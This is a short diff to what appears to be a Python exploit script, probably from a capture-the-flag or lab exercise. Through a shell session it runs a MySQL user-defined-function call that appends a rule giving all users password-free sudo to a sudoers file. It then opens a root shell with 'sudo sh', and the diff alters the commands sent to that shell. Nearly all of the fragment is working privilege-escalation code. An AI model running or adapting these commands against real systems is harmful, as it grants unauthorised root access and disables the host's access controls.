@@ -58,5 +58,6 @@ shell.sendline(b'''select do_system('echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/
 shell.sendline(b"exit")
 shell.sendline(b"sudo sh")
 time.sleep(0.5)
-shell.sendline(b"cd; echo $(id)")
+shell.sendline("export HOME=/; bash")
+shell.sendline(b"export HOME=/root; cd; echo $(id)")
 shell.interactive()
